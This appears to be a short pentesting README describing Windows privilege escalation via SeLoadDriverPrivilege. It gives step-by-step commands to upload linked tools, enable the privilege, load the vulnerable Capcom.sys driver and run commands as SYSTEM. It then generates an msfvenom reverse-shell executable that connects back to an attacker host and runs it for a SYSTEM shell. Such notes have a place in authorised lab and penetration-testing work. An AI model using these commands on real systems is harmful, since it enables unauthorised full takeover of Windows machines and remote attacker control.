# SeLoadDriverPrivilege

If you see this privilege, doesn't matter if it says the priv is Disabled we can Enabled it and exploit it by uploading malicious driver and using that driver we can execute our payload.

# Exploitation

Upload the driver [eoploaddriver_x64.exe](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/eoploaddriver_x64.exe), [Capcom.sys file](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/Capcom.sys), [ExploitCapcom.exe](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/ExploitCapcom.exe) on traget machine under writable directory.

First we need to turn on the privilege of SeLoadDriverPrivilege that is disabled.
```markdown
.\eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv C:\\Temp\\Capcom.sys
```

Now using ExploitCapcom.exe load Capcom.sys to target machine.
```markdown
.\ExploitCapcom.exe LOAD C:\\Temp\\Capcom.sys
```

After successfully loading Capcom.sys we can now run any cmd as privilege user with EXPLOIT keyword.
```markdown
.\ExploitCapcom.exe EXPLOIT whoami
```

Now we can generate a revshell with msfvenom.
You can also use other revshell.
On Attacker vm.
```markdown
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f exe > shell.exe
```

Upload it on Traget machine.
Now execute the payload.
```markdown
.\ExploitCapcom.exe EXPLOIT shell.exe
```

You gonna get reverse shell as SYSTEM.

